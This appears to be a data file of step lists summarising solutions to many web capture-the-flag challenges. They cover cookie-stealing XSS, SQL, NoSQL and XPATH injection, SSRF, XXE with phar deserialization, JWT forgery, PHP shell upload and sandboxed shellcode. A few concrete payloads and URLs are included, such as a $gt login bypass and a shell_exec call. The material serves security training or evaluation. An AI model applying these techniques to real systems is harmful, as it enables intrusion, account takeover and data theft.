    "Use data URI in the form 'data:text/html;base64,<base64 data>' for the payload.",
    "Base64 encode an XMLHttpRequest.",
    "The encoded XMLHttpRequest retrieves document's cookie.",
    "The encoded XMLHttpRequest sends the cookie to a specified server.",
    "Structure the payload in JSON format.",
    "Add the JSON payload to the URL after the first '?' character.",
    "Submit the URL.",
    "Wait for the bot to visit the URL.",
    "Check the server logs.",
    "Identify the received flag as a cookie in the HTTP GET request",
    "Have knowledge of a simple Web server written in Python",
    "The Web server handles only GET and POST requests with files",
    "Developed a suspicion of a directory traversal vulnerability",
    "The suspicion is related to either the GET path handling or the POST filename",
    "Added debug prints to the file for the GET path",
    "Added debug prints to the file for the POST filename",
    "The purpose of adding debug prints is to confirm the suspected vulnerability",
    "Confirmed the existence of a directory traversal vulnerability",
    "The vulnerability is present in the POST filename",
    "Exploited the discovered vulnerability",
    "Wrote a request to the root directory",
    "The filename used in the request was 'lol.txt'",
    "The content written in the request was 'HACKED'",
    "Explored files that could be overwritten",
    "Cannot modify anything in '/home/manhndd/.ssh/'",
    "The reason for inability to modify is due to a lack of appropriate permission",
    "Made the decision to overwrite '.bashrc' file",
    "The execution of '.bashrc' occurs when the user 'manhndd' SSH-es into the server",
    "Engaged in a race with other players",
    "The objective is to overwrite '.bashrc' file with their payload",
    "The absence of 'nc' and any exfiltration method restricts the options",
    "Read the flag from '/var/secret'",
    "Write the flag to '/opt/mydank'",
    "'/opt' is the web facing directory",
    "Performed repetitive actions of sending requests",
    "Used Burp's repeater to spam 'Go'",
    "Simultaneously wrote a Python script",
    "The script reads from '/mydank'",
    "Successfully won the race",
    "Acquired the flag",
    "Visit the website.",
    "Analyse the given hyperlinks.",
    "Investigate the behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Conclude that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Set up a wildcard DNS listener.",
    "Send a request to '/pleb.mysub.dnsbin.zhack.ca'.",
    "Observe the returned DNS query for example.com.",
    "Use nip.io wildcard DNS service.",
    "Send a request to '/pleb.127.0.0.1.nip.io'.",
    "Observe the returned localhost.",
    "Access the 'user' directory.",
    "Find an oddly-named nginx.conf file.",
    "Set up a listener.",
    "Observe that the '/pleb' proxy isn't forwarding non-ASCII characters.",
    "Use double URL encoding.",
    "Bypass the character restriction.",
    "Download the nginx.conf file successfully.",
    "Analyse the downloaded nginx.conf file.",
    "Identify that it uses proxy_pass to forward requests.",
    "Leverage X-Accel-Redirect.",
    "Access the '/admin' directory.",
    "Set up a PHP script on '/pleb.my.ip.nip.io'.",
    "Retrieve the X-Accel-Redirect header.",
    "Reveal the '/admin' directory's contents.",
    "Find a flag.txt file in the '/admin' directory.",
    "Realize it is a misdirection towards '/useradmin'.",
    "Choose to target the '/uberadmin' directory.",
    "Find a potential Off-by-Slash bug.",
    "Identify that nginx concatenates alias directives with location directives.",
    "Use the X-Accel-Redirect PHP script.",
    "Create a request for '/admin../uberadmin/flag.txt'.",
    "Exploit the Off-by-Slash bug.",
    "Return the real flag in the 'uberadmin' directory.",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge.",
    "Recognize that the challenge involves exploiting a page to pop up an alert.",
    "Analyze the source code of the webpage.",
    "Notice that the webpage is a 'Markdown' converter.",
    "Recognize that the 'Markdown' converter uses regex.",
    "Recognize that all open HTML tags '<' have been removed.",
    "Determine that the removal of open HTML tags '<' makes a traditional XSS attack impossible.",
    "Identify a specific replace function within the source code.",
    "Recognize that the specific replace function changes markdown format images into HTML image tags.",
    "Determine that the specific replace function does not sanitize the 'alt' parameter.",
    "Decide to exploit the unsanitized 'alt' parameter.",
    "Inject a double quote to break out of the alt tag.",
    "Add a JavaScript event handler for the XSS attack.",
    "Create the final URL.",
    "Test the final URL.",
    "Trigger the XSS alert attack using the final URL.",
    "Read the problem's given details and description.",
    "Identified it's a Web category challenge.",
    "Goal: Perform an XSS attack and make a URL to trigger alert(1) for getting the flag.",
    "Examine the provided source code.",
    "Source code uses a markdown library to convert markdown into HTML.",
    "Source code runs DOMPurify.",
    "Source code performs some validation.",
    "Notice that DOMPurify is applied on HTML.",
    "Acknowledge that DOMPurify is pretty secure.",
    "Realize it's unlikely they want me to find a vulnerability in DOMPurify.",
    "Saw a statement on DOMPurify's GitHub.",
    "The statement indicates that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS.",
    "Recognize from the source code that it is using jQuery's html() method.",
    "Notice that the SAFE_FOR_JQUERY flag is not being used.",
    "Hint that XSS might be possible in this case.",
    "Start looking for a payload to trigger the XSS.",
    "Look at the unit tests for the SAFE_FOR_JQUERY flag on DOMPurify's GitHub.",
    "Find a section in DOMPurify's unit tests.",
    "The section tests payloads that can cause XSS if used with jQuery's html() method.",
    "Test the payloads from the unit test in the challenge.",
    "The third payload ends up triggering an alert.",
    "Indicate a successful XSS attack.",
    "Create a URL with the successful payload.",
    "Submit the URL.",
    "Receive the flag.",
    "Identify that the challenge is written using the mermaid library",
    "Search for a way to embed an image into a mermaid flowchart",
    "Ensure that a valid graph can be created using a specific format",
    "Attempt to inject code with an embedded script",
    "Fail to inject the code with the embedded script",
    "Realize that the method failed",
    "Identify the reason for the failure as JavaScript trying to parse parentheses",
    "Learn that backticks can be used instead of parentheses in JavaScript",
    "Create a working script",
    "Replace parentheses with backticks in the script",
    "Submit the script in the URL",
    "Obtain the flag",
    "Visit the CTF challenge site.",
    "Analyze the form provided to upload images.",
    "Check the robots.txt on the site.",
    "Examine the source.zip file.",
    "Reveal all the source code.",
    "Download the source.zip file.",
    "Open the source.zip file.",
    "Find upload.php in the source.zip file.",
    "Perform an immutable code inspection of upload.php.",
    "Figure out the XML External Entity (XXE) vulnerability in upload.php.",
    "Identify XML External Entity (XXE) vulnerability when loading SVG files.",
    "Identify serialization in the php code.",
    "Identify serialization in the __construct method.",
    "Identify serialization in the __destruct method.",
    "Host a document type definition (DTD).",
    "Use the personal domain for blind exfiltration of files.",
    "Use the PHP /// uri.",
    "Apply the base64 encoding filter to allow for file reading.",
    "Identify the use of phar:// uri.",
    "Use the phar:// uri in the XML External Entity vulnerability.",
    "Deserialize the object of the Image type using PHP.",
    "Understand the need to create a controlled filename.",
    "Identify when __destruct would be called.",
    "Trigger command execution in the create_thumb function.",
    "Use a technique to disguise a valid phar file.",
    "Disguise the phar file as a JPEG image.",
    "Upload the disguised phar file.",
    "Use the XML External Entity vulnerability to call the disguised phar file.",
    "Create a phar file.",
    "Unserialize the phar file.",
    "Create an Image object with a controlled filename.",
    "Trigger the command './flag_dispenser' when the __destruct method is called.",
    "Trigger the execution of the flag_dispenser command.",
    "Retrieve the flag.",
    "Identified vulnerability in /api/image endpoint",
    "Identified SSRF vulnerability",
    "Injected Carriage Return Line Feed (CRLF) in the username field",
    "Injected FTP commands",
    "Used the profile picture upload feature",
    "Uploaded a file to the FTP server",
    "Used PORT ftp command",
    "Performed SSRF to rabbitmq http API",
    "Utilized REST to discard png header from uploaded file",
    "Injected email queue in rabbitmq",
    "Used 'attachment' parameter",
    "Triggered an email with the flag as content",
    "Access the site at :5555",
    "Log in using user credentials",
    "Access the migrate.php page",
    "Enter new user_id and password",
    "Access the site at :7777",
    "Log in using new user_id and password",
    "Detect SQL injection vulnerability on INSERT statement",
    "Initiate data leaking process",
    "Leak data byte-by-byte by hashing it and using as password for new account",
    "Bruteforce password at :7777 to determine the leaked byte",
    "Cycle between accounts due to 1 minute delay in database reset on new site",
    "Run brute.py script to output arbitrary SQL queries",
    "Dump all tables and columns",
    "Retrieve the flag",
    "Identify control over 'request.body.converter'.",
    "Implement '__defineSetter__' on 'converters'.",
    "Use sessionID as the first parameter.",
    "Create an object that resolves as a promise.",
    "Set 'flagConverted' on the previously set sessionID.",
    "Cause the promise to resolve.",
    "Trigger an error.",
    "Print the flag.",
    "Recognized that the 'basename()' function is used in the PHP script",
    "Observed that the 'basename()' function ignores invalid characters",
    "Realized that the invalid characters in the payload can bypass the regex validation",
    "Designed a URL payload",
    "Included the path '/index.php/config.php/%ff?source' in the payload",
    "Constructed the final payload URL",
    "Sent the request to 'http://18.179.178.246:8003'",
    "Bypassed strip_tags using the PHP bug.",
    "Injected an 'a' tag.",
    "Injected an 'a' tag.",
    "Added the id=like to the injected 'a' tag.",
    "Flag was in the user agent.",
    "Bot clicking our link gave us the flag.",
    "Injected the code to make the bot click our link and reveal the flag.",
    "Identify the presence of a create table statement vulnerability.",
    "Determine that the injection is limited to 32 characters.",
    "Find the validation function in the code.",
    "Identify the list of banned words and special characters that the injection string must not contain.",
    "Discover the possibility of using a \"CREATE TABLE ... SELECT\" SQL statement.",
    "Understand how the SQL statement can transfer results from the select statement into a new table.",
    "Identify the unnecessary parts of the query that need to be wrapped in [] for it to become a valid query.",
    "Apply the necessary adjustments to the injection to ensure it fits within the limitations.",
    "Compile the modified injection query.",
    "Execute the compiled query.",
    "Connect to the website link (http://3.112.91.135/)",
    "Observe a post message",
    "Note the mention of an FBI DB dump at https://tinyurl.com/fbi-hack",
    "Identify the presence of a tripcode",
    "Conduct online research",
    "Discover that the tripcode is generated from a snippet of futaba-ng code",
    "Analyze the code snippet",
    "Determine that the tripcode is a part of an encrypted string",
    "Identify the components of the encrypted string: remote IP address, a seed (IDSEED), and current date",
    "Set IDSEED with 'idの種'",
    "Infer that the IP address has prefix 219",
    "Recognize the tripcode as 'ueyUrcwA'",
    "Assume the posting date as the current date",
    "Write a PHP script",
    "Implement brute force for all possible remaining octets of the IP address within the range of 0 to 256",
    "Generate a tripcode for each possible IP",
    "Compare the generated tripcode with the target",
    "Execute the brute force PHP script",
    "Identify the correct matching tripcodes",
    "Retrieve the corresponding IP address",
    "Form the flag",
    "Identify normal SSRF vulnerability in curl",
    "Exploit SSRF vulnerability to gain access to NFS filesystem",
    "Create symlink on NFS filesystem using the SSRF exploit",
    "Utilize SSRF exploit to write to the created symlink",
    "Overwrite the index.html file",
    "Flip one random bit in the wordpress installation",
    "Flip the comparison check in /var/www/html/wp-includes/user.php at position 5389",
    "Modify the comparison to always allow login even with incorrect password",
    "Log in as admin",
    "Upload PHP shell",
    "Read the flag",
    "Analyze the PHP script.",
    "Use YAML to analyze the script.",
    "Understand that if the IP is from Norway, YAML parses 'NO' as False.",
    "Realize that YAML parsing 'NO' as False allows bypassing escapeshellargs.",
    "Perform a command injection.",
    "Choose the vulnerable points in the script to perform the injection.",
    "Exploit the vulnerability.",
    "Access unauthorized data or perform unauthorized actions.",
    "Use lesscss to evaluate CSS on the backend.",
    "Read arbitrary files with @import (inline) \"/etc/passwd\".",
    "Leak source code.",
    "Use interp to evaluate Golang at runtime from cookie.",
    "Control 'Version' in cookie.",
    "Get arbitrary code execution.",
    "Realize 'os.exec' is blocked.",
    "Use 'os.StartProcess' instead.",
    "Import 'io/ioutil'.",
    "Import 'os'.",
    "Create a function named 'api'.",
    "Read the file 'satellite.txt'.",
    "Define 'os.ProcAttr'.",
    "Assign file descriptors for standard input, output, and error handling.",
    "Start a new process.",
    "Execute '/bin/sh' with an argument to read the flag file and redirect the output to '/tmp/jizz'.",
    "Wait for the process to complete.",
    "Return the content of 'satellite.txt'.",
    "Identify the vulnerability (CVE-2022-26377).",
    "Exploit the vulnerability to enable Request Smuggling.",
    "Craft AJP Requests to be sent using Request Smuggling.",
    "Refer to a writeup for information on crafting the AJP request.",
    "Craft the AJP request to leak the source code of index.jsp.",
    "Inspect the response from index.jsp.",
    "Observe that the system environment flag is displayed when the response contains the specific IP address (119.29.29.29).",
    "Determine the required fake address.",
    "Craft another request and set the remote_addr to the required fake address.",
    "Submit the crafted request to the server.",
    "Capture the response from the server.",
    "Extract the system flag from the response.",
    "Obtain an exploit script for generating the payload.",
    "Configure the exploit script with the necessary parameters.",
    "Execute the exploit script to generate the payload.",
    "Obtain the payload generated by the exploit script.",
    "Construct a curl command to send the payload to the server.",
    "Execute the curl command to send the payload to the server.",
    "Open a web browser.",
    "Enter the provided URL in the address bar.",
    "Follow the URL redirection (if applicable) to the file location.",
    "Open the file using an appropriate application or viewer.",
    "Read and retrieve the flag from the displayed contents.",
    "Decode the jwt cookie",
    "Use 'JsonCookies' to create a json object",
    "Pass the decoded cookie to the 'app.render' function",
    "Set the 'view options' setting",
    "Run arbitrary javascript with the 'outputFunctionName' option",
    "Run command line script using curl",
    "Set up a request with malicious cookie data",
    "Execute child process for reading the flag file",
    "Bypassed input validation",
    "Email only required to start validly",
    "Any characters allowed after the valid start of email",
    "Inputted negative 'rate' value",
    "Bypassed duration check",
    "Injected arbitrary HTML",
    "HTML rendering by pdfkit/wkhtmltopdf",
    "Injected iframe",
    "'src' set to local files",
    "Leaked secret key '19eb794c831f30f099a31b1c095a17d6' from 'config.py'",
    "Used leaked secret key",
    "Faked session with 'is_admin' privileges",
    "Allowed reading the flag",
    "Identified the challenge as an XPATH injection challenge.",
    "Decided to find a paper that was not published.",
    "Created an XPATH injection payload.",
    "Inserted the payload into the target site's URL.",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack.",
    "Recognize the calculator app filters out potential XSS attacks",
    "Analyze 'calc.js'",
    "Identify controllable variables in 'calc.js'",
    "Identify ability to control 'astProgram.type' variable",
    "Understand the variable sets the type attribute for the script element",
    "Decide to provide code in the form of JSON object",
    "Realize 'JSON.parse()' will parse the provided code JSON",
    "Decide to switch 'astToJs' to 'evalCode'",
    "Understand this switch allows the execution of custom code within the app",
    "Decide to use Import Maps",
    "Understand using Import Maps will help in switching 'astToJs' to 'evalCode'",
    "Decide to create a new HTML script element",
    "Set 'program' as the id for the new HTML script element",
    "Set 'json' as the language attribute for the new HTML script element",
    "Set 'importmap' as the type attribute for the new HTML script element",
    "Inside the new HTML script element, decide to add an 'imports' key",
    "Set the 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Decide to add custom JavaScript code to the 'code' key",
    "Understand this custom JavaScript code will leak the cookie",
    "Provide an empty array for 'variables'",
    "Decide to execute a Python script (solve.py)",
    "Obtain the flag through the execution of solve.py",
    "Use /apisix/batch-requests endpoint.",
    "Perform SSRF to localhost.",
    "Target only admin endpoint.",
    "Utilize hardcoded key.",
    "Inject CRLF characters in Lua's HTTP library.",
    "Bypass the X-Real-IP protection.",
    "Analyze the contents of the 'server.py' file.",
    "Understand the workflow of the Flask web server.",
    "Review the code of the 'query_login_attempt' function.",
    "Identify a potential vulnerability within the function.",
    "Enter an empty username and arbitrary password.",
    "Exploit the vulnerability in the 'query_login_attempt' function.",
    "Successfully log in to the system.",
    "Inspect the code of the 'query_kill_time' function.",
    "Identify a SQL Injection vulnerability within the function.",
    "Observe the presence of a WAF named 'Skynet' that filters requests.",
    "Create an SQL injection payload.",
    "Encode the payload into 'multipart/form-data'.",
    "Use the encoded payload to bypass the WAF 'Skynet'.",
    "Execute the SQL injection payload created in the previous step.",
    "Manipulate the query using the union operation.",
    "Fetch data using the manipulated query.",
    "Access the 'target_credentials' database.",
    "Identify the 'secret_key' column within the database.",
    "Discover the flag 'rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}' in the 'secret_key' column of the database.",
    "Checked 'req.files' in check.js.",
    "'next()' was called in each iteration causing express to continue.",
    "Uploaded a larage number of valid files.",
    "Manipulated 'app.post('/upload' to process with invalid 'req.files[req.query.formid]'.",
    "Uploaded .htaccess file.",
    "Used previous step's vulnerability to upload.",
    "Used 'Redirect 307' to read arbitrary files.",
    "Read the file '/etc/passwd'.",
    "Read the file 'apache.conf'.",
    "Highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Combined output filter.",
    "Used 'SetEnv LD_PRELOAD' to execute code when running gzip.",
    "Referenced 'solv.py' file.",
    "Finalized the solution.",
    "Access and examine the source code of the website.",
    "Identified the condition that only PDF files containing 'ECHO' would be signed.",
    "Identified the 'openssl_verify' function in website source code.",
    "Understood the function is used to sign PDF files.",
    "Understood default signature algorithm of openssl_verify is SHA1.",
    "Realized the susceptibility of SHA1 algorithm for PDFs.",
    "Utilized SHATTERED tool.",
    "Exploited SHA1 vulnerability using SHATTERED.",
    "Created two PDFs with same SHA1 hash exploiting the SHA1 vunlerability with SHATTERED.",
    "Uploaded the first created PDF file to the website.",
    "Used the website functionality to get the uploaded PDF file signed.",
    "Retrieved the signature from the first signed PDF.",
    "Applied the retrieved signature to the second PDF.",
    "The server recognized the signature and provided the flag.",
    "Visit the targeted website.",
    "Notice the presence of a PHP eval function.",
    "Encounter challenges while trying to navigate up directories.",
    "Attribute the challenges to the `basedir` restriction.",
    "Take a break.",
    "Return to the problem.",
    "Have a clearer perspective.",
    "Investigate the source code of the website.",
    "Look for any unusual strings.",
    "Notice the mention of `shell_exec` on the website.",
    "Guess that `shell_exec` might be allowed on the website.",
    "Run the command `echo shell_exec(\"../flag\");` on the website.",
    "Observe successful execution of the command.",
    "Conclude that the problem might have been misconfigured.",
    "Successfully obtain the flag.",
    "Log into the website.",
    "Encounter a message saying browser is unsupported.",
    "Move into burp suite.",
    "Log in to investigate any intermediate requests.",
    "Notice a 302 found page.",
    "Page contains some HTML and JavaScript.",
    "Identify a scoped style attribute.",
    "Identify a `navigator.battery.charging call` in the JavaScript.",
    "Deduce that style scoped only works in Firefox versions 21-54.",
    "Brute-force user-agent strings in burp suite.",
    "Use version 43.0 for the user-agent string.",
    "Successfully extract the flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}.",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment.",
    "Identified the presence of a shared object entitled `shellme.so`.",
    "Noticed a website related to the challenge.",
    "Appended `?source` to the index.php of the site.",
    "Observed that the source code of the site became visible.",
    "Reviewed the source code.",
    "Determined that sending a GET request with 'source' as a parameter reveals the source code.",
    "Identified from the source code that a POST request with 'shell' as a parameter echoes the input.",
    "Understood that the echoed input is sent to the `shellme()` function with a character limit of 1000.",
    "Determined that the function `shellme()` is defined in the shared object `shellme.so`.",
    "Tracked the function `shellme()` inside the `shellme.so` shared object file.",
    "Found that `shellme()` leads to the function `shell_this()`.",
    "Identified that the input is copied to a mmap-ed memory region within the function.",
    "Noticed the use of `SECCOMP_MODE_STRICT` seccomp sandbox.",
    "Determined that it allows only read, write, and exit syscalls before executing the input.",
    "Identified the use of strlen() function within the code.",
    "Realized this would truncate any shellcode at null bytes.",
    "Reviewed the PHP code closely.",
    "Discovered a connection being made to a MySQL server prior to shellcode execution.",
    "Read the challenge's description.",
    "Understood that the desired flag is located within the 'flag' table in MySQL.",
    "Identified that the File Descriptor (FD) for MySQL server connection is open before shellcode execution.",
    "Realized SQL queries can be dispatched to this open FD to read responses.",
    "Understood that the server is running php-cgi.",
    "Recognized the necessity to write a php-cgi header before executing the MySQL query.",
    "Prepared the SQL query to send to File Descriptor (FD) 4, which is the MySQL server.",
    "Waited and read the response as it came in.",
    "Wrote the received response to stdout.",
    "Referenced the MySQL documentation related to the protocol level.",
    "Constructed the MySQL query ensuring it follows the little-endian, 4 bytes format for length, used 1-byte for query type (0x3 for this specific query), and then added the actual query content.",
    "Wrote the cgi header with 'Content-type: text/html'.",
    "Sent the SQL query to FD 4 (MySQL server).",
    "Read the response from FD 4.",
    "Wrote the received response to the intended output.",
    "Set up a Python-based environment.",
    "Utilized the environment to assemble and debug shellcode.",
    "Designed the shellcode.",
    "Employed the JMP - CALL - POP technique within the shellcode to acquire strings in the registers.",
    "Transformed relative JMPs into PLT type trampolines.",
    "This was done to prevent large JMPs containing null bytes.",
    "Introduced NOP Sled to efficiently manage oversized jumps.",
    "Created the shellcode ensuring it has no NULL bytes.",
    "Verified the shellcode's functionality and ensured compatibility with the `strlen()` function within 'shellme()' in the `shellme.so` file.",
    "Executed the verified and assembled shellcode.",
    "Observed the expected output - 'Content-type: text/html' cgi header.",
    "Noted that the SQL query was sent to FD 4.",
    "Read the response from FD 4.",
    "Wrote the received response as the final output.",
    "Opened the CTF challenge.",
    "Read the initial text.",
    "Tried submitting possible answers.",
    "Used wordplay in the answers.",
    "No success in submitting the answers.",
    "Decided to open the Network tab.",
    "Opened the Google Chrome console.",
    "Viewed the backend activity in the Network tab.",
    "Found a JSON response.",
    "Read the message in the JSON response.",
    "The message hinted that the flag was already visible.",
    "Understood from the JSON response.",
    "Realized the flag was in the comment within the response.",
    "Submitted the flag.",
    "Used the flag present in the JSON response.",
    "Analyze the challenge",
    "Identify the text input for HTML notes",
    "Identify the rendered HTML page from textarea inside an iframe",
    "Take note of the embedded iframe",
    "Take note that the embedded iframe is within the same origin",
    "Take note that the data is sanitized by DOMPurify",
    "Understand that the challenge is to bypass a script inside the iframe",
    "Understand that the script validates the origin and ID of the message",
    "Understand that the script prevents rendering of the body content",
    "Identify the need to steal the identifier",
    "Identify the need to steal the saved note",
    "Identify the need to use a valid identifier to steal the data",
    "Understand that the challenge involves a Same-Origin XSS attack",
    "Observe from user session that the identifier is stored",
    "Observe from user session that the session cookie was set to Lax",
    "Acknowledge that the challenge involves bypassing origin check",
    "Acknowledge that the bypass involves embedding the iframe",
    "Acknowledge that the bypass involves forcing a 'null' origin",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes",
    "Recognize that 'allow-popups-to-escape-sandbox' can prevent the inheritance of sandbox attributes by pop-ups",
    "Open a pop-up to the target URL",
    "Cause the pop-up to inherit the sandboxed attributes",
    "Send an XSS to the pop-up",
    "Steal the identifier from the pop-up",
    "Open the target URL",
    "Send an XSS with the stolen identifier",
    "Set the origin as the target URL",
    "Implement the series of steps",
    "Use the Proof of Concept script",
    "Navigate to the website",
    "Right click on the webpage",
    "Select 'Inspect' or 'Inspect Element'",
    "Open the Inspect Element tool",
    "Navigate to the 'Sources' tab",
    "Inspect the visible scripts",
    "Explore the source code files",
    "Find the flag in the source code",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Encode the JWT by setting the algorithm to 'none'",
    "Send the malicious JWT to the server",
    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "Inspect the webpage",
    "Understand the functionality",
    "Identify `/getflag` endpoint",
    "Identify `/cookies` endpoint",
    "Visit the `/cookies` endpoint",
    "Display current cookies",
    "Notice the particular cookie",
    "Use the script on the prepared website",
    "Read the window variable using JavaScript",
    "Find admin cookie",
    "Capture admin's cookie",
    "Submit the admin's cookie",
    "Get the flag",
    "Recognize that the page allows you to upload a custom HTML page.",
    "Recognize that you can report suspicious URLs to the admin.",
    "Identify that the <script>alert('pwned')</script> won't be executed.",
    "Identify that the reason for the script not being executed is the DOMValidator.js script.",
    "Realize that this JS file calculates some sort of document's hash.",
    "Realize that the JS file compares the calculated hash with the original hash.",
    "Note that the page wasn't setting any X-XSS-Protection header.",
    "Note that the XSS-Auditor in Chrome 74 is set to mode=filter.",
    "Note that mode=filter means any reflected XSS will be filtered and not executed.",
    "Append the xss=<script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\"> parameter to the query.",
    "Recognize that the sha512.js script will be filtered as a result of appending the parameter.",
    "Realize that the filtering of sha512.js will cause the DOMValidator.js to crash.",
    "Understand that the crash of DOMValidator.js will allow the execution of <script>alert('pwned')</script>.",
    "Send the crafted URL, which includes the injected script, to the admin.",
    "Expect to receive the flag as a result of the successful injection.",
    "Explore the website interface.",
    "Recognize that the interface allows for creating redirect URLs, changing admin's password, and reporting URLs.",
    "Query the protection of the website by CSRF tokens.",
    "Find out that the website isn't protected by CSRF tokens but employs SameSite=Lax cookies.",
    "Decide on the challenge to change the admin's password.",
    "Find the option to pass it as a URL parameter.",
    "Inspect the code in the /redirect.",
    "Discover a potential for XSS injection.",
    "Understand that the potential XSS injection is blocked by the Content-Security-Policy header.",
    "Identify the anchor element that allows for a 'ping' attribute.",
    "Recognize the opportunity that 'ping' sends a POST request when the link is clicked.",
    "Think of exploiting this opportunity.",
    "Insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "Determine the payload to be inserted.",
    "Insert the payload which is a URL that generates a password change request for the admin account when clicked.",
    "Log in using the newly changed credentials of the admin account.",
    "Retrieve the flag.",
    "Interpreted a template string",
    "Used Python's format function",
    "Used request.args as the argument",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Discovered that the goal was to read the 'app.secret_key' value",
    "Ran the server locally",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Found the chain of properties",
    "Led to the Flask.app object",
    "Used the found object",
    "Accessed the 'app.secret_key' value",
    "In the 'Flask.current_app' module",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Executed the Python script",
    "Solved the challenge",
    "Using the command: python3 -m flask run",
    "Request 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Use Python-random-module-cracker tool",
    "Predict the next 'nonces'",
    "Create a paste",
    "Include multiple script tags",
    "Assign different nonce to each script tag",
    "Expect that one of the nonces will work",
    "Admin visits the page",
    "Obtain the admin's cookie",
    "Use the admin's cookie to retrieve the flag",
    "Identify that the task is similar to the previous one.",
    "Recognize that blind NoSQL injection is required.",
    "Understand that the goal is to fetch all of the password's characters.",
    "Begin using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}}",
    "Observe that the payload returns 'true'.",
    "Try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}",
    "Observe that the payload returns 'false'.",
    "Infer that fetching passwords is possible by comparing password characters to the alphabet in the payload.",
    "Perform a bruteforce attack.",
    "Compare all characters in a possible range.",
    "Find that the password is 'congratsyouwin' via the bruteforcing method.",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}.",
    "Identified the challenge as a NoSQL Injection task",
    "Open curl in terminal or command line.",
    "Compose a POST request for the server's login endpoint.",
    "Send the composed POST request via curl.",
    "Compose a JSON body with 'username': 'admin'.",
    "In the password field of the JSON body, use NoSQL's $gt operator to bypass password check by typing {\"$gt\": \"a\"}.",
    "Include the composed JSON body in the POST request.",
    "Create a manipulated cookie for bypassing session-based authentication.",
    "Include the manipulated cookie in the request's header.",
    "Check the response of the POST request for a session cookie.",
    "Identify and store the authenticated session cookie for 'admin' from the response.",
    "Inject the authenticated session cookie into the browser or curl.",
    "Use the browser or curl to navigate to the site's main page.",
    "Inspect the contents of the accessed page.",
    "Identify and retrieve the CTF flag from the page contents.",
    "Inspect the provided instance of the website.",
    "Study the functions of the website including 'flag store', create new store, update created store description, and create items in created store.",
    "Identify potential vulnerabilities and points of entry in the website.",
    "Take note of suspect templates in the webpage's code, such as an 'update store description' template.",
    "Recognize the problem could be related to Server-side Template Injection.",
    "Begin to test this theory with 'handlebars', a tool which previously had a known vulnerability in processing templates.",
    "Assess the function of the 'handlebars' library within the system.",
    "Consider whether this could present an entry point if a vulnerability, such as Template Injection, can be exploited successfully.",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability.",
    "Identify a token structure.",
    "Consider if manipulating this token structure could allow for unauthorized purchases from the 'flag store'.",
    "Identify how the 'id' in the token is created.",
    "Understand how the token is signed using 'store.key'.",
    "Analyze the structure of the store object.",
    "Recall if there are any properties that are not defined initially but used later.",
    "Locate where 'store.key' is defined using 'crypto.randomBytes'.",
    "Identify when this function is called.",
    "Note what actions trigger the key's update.",
    "Devise a strategy involving acquiring the secret key from the store object.",
    "Plan to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Recognize the security checks in place.",
    "Understand that the crucial check occurs in the 'checkout(req, res)' function that verifies the token's signature matches the key.",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key'.",
    "Try to access or replace 'store.key' through the Template Injection vulnerability.",
    "Consider redefining the Object prototype if it's necessary.",
    "Find a way around the lack of access to the constructor property.",
    "Consider using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Apply the determined attack vector to exploit the system.",
    "Override the prototype using a payload to set a context to the prototype of [object].",
    "Redefine 'key' through '__defineSetter__' and '__defineGetter__'.",
    "Ensure the injection payload has been executed.",
    "Verify that the accessor for 'key' has been overridden and behaves as expected.",
    "Create a token with the overridden '[object Object]' as the secret key.",
    "Use 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Automate the process through script.",
    "Execute the exploit to retrieve the flag ('flag{npm_devs_are_pretty_bad_at_fixing_bugs}').",
    "Complete the CTF.",
    "Access the website",
    "Observe functionalities for login/register, edit profile, and support",
    "Access the 'Support' section",
    "Observe the two types of messages: 'Problems with Profile' and 'Get premium account'",
    "Provide 'Link to profile' and 'Message' in the selected message type",
    "Access the 'Edit profile' section",
    "Edit the user's own name",
    "Manually modify the 'Link to profile' field",
    "Select the first option in the 'Support' section",
    "Make the admin visit the modified 'Link to profile'",
    "Observe the 'User-Agent header' and note the admin uses 'Firefox 61.0'",
    "Observe the HTTP response header",
    "Note the various constraints mentioned in the header",
    "Identify the parameter 'uuid' in the request URL",
    "Determine that the 'uuid' parameter is vulnerable to injections (XSS/CSS)",
    "Note the limitation of '36 characters' for the 'uuid' parameter",
    "Perform a dirbuster scan",
    "Discover the 'manage.php' page",
    "Determine the purpose of the 'manage.php' page: changing 'user status' to 'premium'",
    "Identify the 'hidden token' protection",
    "Note that the tokens are associated with the current session",
    "Attempt to send 'POST' data to 'profile.php' with a different 'Referrer'",
    "Attempt to send 'POST' data to 'manage.php' with a different 'Referrer'",
